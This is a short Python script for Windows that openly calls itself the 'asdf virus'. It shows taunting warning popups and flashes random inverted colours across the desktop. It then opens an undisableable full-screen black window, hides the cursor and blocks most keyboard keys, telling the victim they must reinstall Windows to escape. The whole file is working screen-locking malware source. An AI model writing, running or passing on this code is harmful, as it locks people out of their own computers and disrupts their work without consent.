from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
from random import randint as rand
from tkinter import *
from tkinter import messagebox
import keyboard
import time

desk = GetDC(0)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)
dc = GetDC(0)

w = Tk()
w.eval('tk::PlaceWindow %s center' % w.winfo_toplevel())
messagebox.showwarning('Last Warning!','You have running asdf virus, so you use while your PC can alive you can!')
w.deiconify()
w.destroy()
w.quit()

for i in range(0, 10):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255)
    ))
    SelectObject(desk, brush)
    PatBlt(desk, randrange(x),randrange(y),randrange(x),randrange(y), PATINVERT)
    w, h = GetSystemMetrics(0), GetSystemMetrics(1)
    BitBlt(dc, rand(0, 2), rand(0, 2), w, h, dc, rand(0, 2), rand(0, 2), SRCAND)
    DeleteObject(brush)
    Sleep(10)
ReleaseDC(desk, GetDesktopWindow())
DeleteDC(desk)

a = Tk()
messagebox.showwarning('LOL','So... You will stuck in this window forever')
a.deiconify()
a.destroy()
a.quit()

window = Tk()
window.attributes('-fullscreen', True)
window['background'] = '#000000'
window.config(cursor="none")
var = StringVar()
label = Label(window , textvariable=var, bg='#000000',fg='#ffffff')
window.attributes('-disabled', True)
window.config(cursor="none")
var.set("You will here forever!!! No Keyboard? If you want to pause it, reinstall the windows! Your file is here, but you can't close this window!")
label.pack()
for i in range(150):
    keyboard.block_key(i)
window.mainloop()
